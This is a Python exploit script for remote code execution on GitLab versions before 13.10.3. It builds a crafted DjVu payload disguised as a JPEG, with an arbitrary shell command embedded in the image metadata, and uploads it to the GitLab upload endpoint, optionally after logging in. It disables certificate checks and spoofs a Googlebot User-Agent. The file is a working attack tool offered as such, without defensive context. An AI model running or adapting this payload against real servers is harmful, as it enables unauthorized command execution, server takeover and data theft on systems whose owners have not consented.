import requests
import re
import argparse
import uuid

from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

parser = argparse.ArgumentParser(description='GitLab < 13.10.3 RCE')
parser.add_argument('-u', help='Username', required=False)
parser.add_argument('-p', help='Password', required=False)
parser.add_argument('-t', help='URL (Eg: http://gitlab.example.com)', required=True)
parser.add_argument('-c', help='Command to execute', required=True)
args = parser.parse_args()
username = args.u
password = args.p
gitlab_url = args.t
command = args.c

session = requests.Session()
session.verify = False 
CSRF_PATTERN = re.compile(rb'csrf-token" content="(.*?)" />')
def csrf_token():
    response = session.get(f'{gitlab_url}/users/sign_in', headers={'Origin': gitlab_url}, verify=False)
    g = CSRF_PATTERN.search(response.content)
    assert g, 'No CSRF Token found'

    return g.group(1).decode()


# Authenticating
if username != None and password != None:
    print("[+] Authenticating")
    token = csrf_token()
    login_form = {
        "authenticity_token": token,
        "user[login]": username,
        "user[password]": password,
        "user[remember_me]": "0"
    }
    r = session.post(f"{gitlab_url}/users/sign_in", data=login_form, verify=False)
    if r.status_code != 200:
        exit(f"[x] Login Failed:{r.text}")
    else:
        print("[+] Successfully Authenticated")
else:
    print("[!] User name and password are not provided. Skip the authentication process...")


# RCE Payload 
def get_payload(command):
    rce_payload = b'\x41\x54\x26\x54\x46\x4f\x52\x4d'
    rce_payload += (len(command) + 0x55).to_bytes(length=4, byteorder='big', signed=True)
    rce_payload += b'\x44\x4a\x56\x55\x49\x4e\x46\x4f\x00\x00\x00\x0a\x00\x00\x00\x00\x18\x00\x2c\x01\x16\x01\x42\x47\x6a\x70\x00\x00\x00\x00\x41\x4e\x54\x61'
    rce_payload += (len(command) + 0x2f).to_bytes(length=4, byteorder='big', signed=True)
    rce_payload += b'\x28\x6d\x65\x74\x61\x64\x61\x74\x61\x0a\x09\x28\x43\x6f\x70\x79\x72\x69\x67\x68\x74\x20\x22\x5c\x0a\x22\x20\x2e\x20\x71\x78\x7b'
    rce_payload += command.encode()
    rce_payload += b'\x7d\x20\x2e\x20\x5c\x0a\x22\x20\x62\x20\x22\x29\x20\x29\x0a'
    return rce_payload

# Upload file
upload_file_url = f"{gitlab_url}/uploads/user"

files = {"file": ("%s.jpg" % uuid.uuid1(), get_payload(command), "image/jpeg")}
try:
    resp = session.post(
        url=upload_file_url,
        files=files,
        headers={
        "X-CSRF-Token": csrf_token(),
        "Referer": upload_file_url,
        "Accept": "application/json",
        'User-Agent':'Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)'
        }, verify=False, timeout=5)
except requests.exceptions.ReadTimeout as ex:
    print("[+] Timed out and may have succeeded.")

if "markdown" in resp.text:
    exit("[x] RCE failed")
elif "Failed to process image" in resp.text:
    print("[+] RCE triggered successfully")
